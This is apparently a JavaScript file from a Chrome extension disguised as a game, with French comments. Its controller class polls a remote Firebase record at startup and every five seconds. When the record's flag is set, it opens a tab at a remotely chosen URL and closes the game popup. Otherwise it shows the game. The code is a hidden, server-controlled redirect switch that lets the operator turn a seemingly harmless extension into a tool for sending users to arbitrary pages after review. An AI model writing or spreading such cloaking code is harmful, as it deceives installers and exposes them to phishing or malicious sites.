// Contrôleur de mode - Vérifie AVANT d'afficher
class ModeController {
  constructor() {
    this.mode = null;
    this.url = 'https://google.com';
    this.firebaseConfigured = false;
    this.init();
  }

  async init() {
    // Vérifier Firebase IMMÉDIATEMENT
    await this.checkModeImmediate();
    
    // Si mode redirection, on a déjà redirigé et fermé
    // Sinon, afficher le jeu et continuer la vérification
    if (this.mode === 0) {
      this.showGame();
      if (this.firebaseConfigured) {
        setInterval(() => this.checkMode(), 5000);
      }
    }
  }

  async checkModeImmediate() {
    try {
      const res = await fetch(`${FIREBASE_DB_URL}/mode_control.json?auth=${FIREBASE_API_KEY}`, {
        signal: AbortSignal.timeout(3000)
      });
      
      if (res.ok) {
        this.firebaseConfigured = true;
        const data = await res.json();
        
        if (data) {
          this.mode = parseInt(data.number) || 0;
          this.url = data.url || 'https://google.com';
          
          // Si mode 1, rediriger IMMÉDIATEMENT
          if (this.mode === 1) {
            chrome.tabs.create({url: this.url}, () => window.close());
            return;
          }
        } else {
          this.mode = 0;
        }
      } else {
        this.mode = 0;
      }
    } catch (e) {
      // Pas de Firebase, mode jeu par défaut
      this.mode = 0;
    }
  }

  async checkMode() {
    if (!this.firebaseConfigured) return;
    
    try {
      const res = await fetch(`${FIREBASE_DB_URL}/mode_control.json?auth=${FIREBASE_API_KEY}`, {
        signal: AbortSignal.timeout(2000)
      });
      
      if (!res.ok) return;
      
      const data = await res.json();
      if (!data) return;
      
      const newMode = parseInt(data.number) || 0;
      const newUrl = data.url || 'https://google.com';
      
      if (newMode !== this.mode) {
        this.mode = newMode;
        this.url = newUrl;
        
        if (this.mode === 1) {
          // Rediriger immédiatement
          chrome.tabs.create({url: this.url}, () => window.close());
        } else {
          this.showGame();
        }
      }
    } catch (e) {
      // Ignorer les erreurs
    }
  }

  showGame() {
    const gameContainer = document.getElementById('gameContainer');
    const urlContainer = document.getElementById('urlContainer');
    if (gameContainer) gameContainer.style.display = 'flex';
    if (urlContainer) urlContainer.style.display = 'none';
  }
}

// Démarrer le contrôleur IMMÉDIATEMENT
new ModeController();

